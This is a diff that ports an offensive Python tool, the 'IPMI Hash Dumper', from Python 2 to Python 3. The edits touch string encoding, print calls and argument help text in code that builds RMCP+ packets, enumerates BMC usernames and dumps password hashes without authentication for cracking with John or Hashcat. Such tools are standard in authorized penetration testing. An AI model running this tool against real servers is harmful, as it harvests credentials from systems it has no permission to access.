@@ -1,4 +1,4 @@
-#! /usr/bin/env python2
+#! /usr/bin/env python3
 '''
 	Copyright 2019 Photubias(c)
 
@@ -36,7 +36,7 @@ def recv_only(s):
     return data, addr
 
 def convertInt(iInput, iLength): ## convertInt(30, 8) == '1e000000'
-    return struct.pack("<I" , int(iInput)).encode('hex')[:iLength]
+    return struct.pack("<I" , int(iInput)).hex()[:iLength]
 
 def send_and_receive(sock, dIP, dPort, data):
     send_only(sock, dIP, dPort, data)
@@ -110,14 +110,14 @@ def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
     #sock.bind((sSrcIP,0))
     
     ### Packet 1 (RMCP+ Open Session Request)
-    rSessionID = binascii.hexlify(os.urandom(4))
+    rSessionID = binascii.hexlify(os.urandom(4)).decode()
     # <Version:06><Reserved:00><Sequence:ff><TypeIPMI, Normal RMCP:07>
     # <AuthenticationType,RCMP+:06><PayloadType:10><SessionID:00000000><SessionSequenceNr:00000000><MessageLength:2000>
     # <DATA> 00000000 41b781df 00000008 01000000 01000008 01000000 02000008 01000000
     data = '06 00 ff 07'
     data += '06 10 00000000 00000000 2000'
     data += '00000000 ' + rSessionID + ' 00000008 01000000 01000008 01000000 02000008 01000000'
-    try: sResponse1 = send_and_receive(sock, dIP, dPort, data)
+    try: sResponse1 = send_and_receive(sock, dIP, dPort, data).decode()
     except:
         if bVerbose: print('[!] Error, IP ' + str(dIP) + ' not reachable')
         return '', ''
@@ -136,11 +136,11 @@ def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
     data = '06 00 ff 07 '
     sUserLength1 = convertInt(28 + len(sUser), 2)
     data += '06 12 00000000 00000000 ' + sUserLength1 + '00'
-    rRequestSALT = binascii.hexlify(os.urandom(16))
+    rRequestSALT = binascii.hexlify(os.urandom(16)).decode()
     sUserLength2 = convertInt(len(sUser), 2)
-    sHexUser = binascii.hexlify(sUser)
+    sHexUser = binascii.hexlify(sUser.encode()).decode()
     data += '00000000 ' + rRequestID + ' ' + rRequestSALT + ' 1400 00' + sUserLength2 + ' '  + sHexUser
-    sResponse2 = send_and_receive(sock, dIP, dPort, data)
+    sResponse2 = send_and_receive(sock, dIP, dPort, data).decode()
     iMessageLength = int(sResponse2[28:30],16)
     if iMessageLength == 8:
         if bVerbose: print('[-] User \'' + sUser + '\' does not seem to be a valid user on this system')
@@ -205,24 +205,24 @@ def main():
     bScan = False
     ## Banner
     os.system('cls' if os.name == 'nt' else 'clear')
-    print """
+    print("""
     [*****************************************************************************]
                           --- IPMI Hash Dumper ---
     This script will try multiple users and without authentication dump hashes.
     Just run it without arguments, or provide arguments of your choice
     ______________________/-> Created By Tijl Deneut(c) <-\_______________________
     [*****************************************************************************]
-    """
+    """)
     ## Defaults and parsing arguments
     parser = argparse.ArgumentParser()
-    parser.add_argument('-t', '--target', help="Target IP address", default='')
-    parser.add_argument('-p', '--port', help="Target UDP Port", default=623, type=int)
+    parser.add_argument('-t', '--target', help="TARGET mode, provide IP address", default='')
     parser.add_argument('-s', '--scan', help="SCAN mode, provide subnet (ignores target)", default='')
-    parser.add_argument('-v', '--verbose', help="Verbosity; More info", action="store_true")
-    parser.add_argument('-l', '--list', help="[Optional] File with list of usernames. E.g. '/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt'", default='')
-    parser.add_argument('-o', '--output', help="Create output files for John & Hashcat", action='store_true')
+    parser.add_argument('-p', '--port', help="Target UDP Port, default 623", default=623, type=int)
+    parser.add_argument('-v', '--verbose', help="Verbosity; more info", action="store_true")
+    parser.add_argument('-l', '--list', help="Custom list of usernames. E.g. '/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt'", default='')
+    parser.add_argument('-o', '--output', help="Create output files for John & Hashcat, default on when scanning", action='store_true')
     args = parser.parse_args()
-    if args.target == '' and args.scan == '': dIP = raw_input('Please enter target IP address [192.168.1.1]: ')
+    if args.target == '' and args.scan == '': dIP = input('Please enter target IP address [192.168.1.1]: ')
     elif not args.target == '': dIP = args.target
     dPort = args.port
     if args.verbose == 1: bVerbose = True
